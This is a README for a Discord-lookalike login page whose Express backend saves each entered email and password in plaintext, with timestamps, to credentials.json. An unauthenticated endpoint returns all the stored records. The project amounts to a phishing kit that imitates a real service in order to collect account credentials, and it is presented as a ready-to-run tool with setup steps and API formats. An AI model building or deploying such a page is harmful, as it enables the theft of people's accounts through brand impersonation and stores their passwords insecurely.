# Discord Login - JSON Credentials Storage

A Discord-like login page that saves username and password to a JSON file on the server.

## How It Works

1. User enters email/username and password in the login form
2. When "Log In" button is clicked, the data is sent to the backend API
3. Backend saves the credentials to `credentials.json` file
4. The JSON file stores all login attempts with timestamps

## Project Structure

```
├── index.html           # Main login page
├── css/
│   ├── index.css       # Base styles
│   └── main.css        # Main page styles
├── js/
│   └── script.js       # Frontend logic & animations
├── assets/             # Images, fonts, SVG files
├── server.js           # Express.js backend server
├── package.json        # Dependencies
└── credentials.json    # Generated after first login
```

## Setup Instructions

### 1. Install Node.js
Download and install Node.js from [nodejs.org](https://nodejs.org)

### 2. Install Dependencies
```bash
npm install
```

### 3. Run the Server
```bash
npm start
```

The server will start at **http://localhost:3000**

### 4. Open in Browser
- Navigate to http://localhost:3000
- Enter any email and password
- Click "Log In"
- Data will be saved to `credentials.json`

## API Endpoints

### Save Login Credentials
**POST** `/api/save-login`
```json
{
  "email": "user@example.com",
  "password": "password123"
}
```

### Get All Login Records
**GET** `/api/get-logins`
Returns all saved credentials

### Clear All Records
**DELETE** `/api/clear-logins`
Clears the `credentials.json` file

## credentials.json Format

```json
[
  {
    "email": "user@example.com",
    "password": "password123",
    "timestamp": "2024-01-22T10:30:00.000Z"
  },
  {
    "email": "another@example.com",
    "password": "pass456",
    "timestamp": "2024-01-22T10:31:00.000Z"
  }
]
```

## Features

✅ Beautiful Discord-like UI  
✅ QR code animation  
✅ Loading spinner on login button  
✅ JSON file storage for credentials  
✅ Timestamp tracking for each login  
✅ RESTful API endpoints  
✅ Error handling  

## Troubleshooting

**Port 3000 already in use?**
Edit `server.js` line 5 and change `const PORT = 3000;` to another port like `3001`

**credentials.json not appearing?**
Check that you clicked the login button and the server responded successfully

**CORS errors?**
Make sure you're accessing the page from http://localhost:3000, not file:// protocol
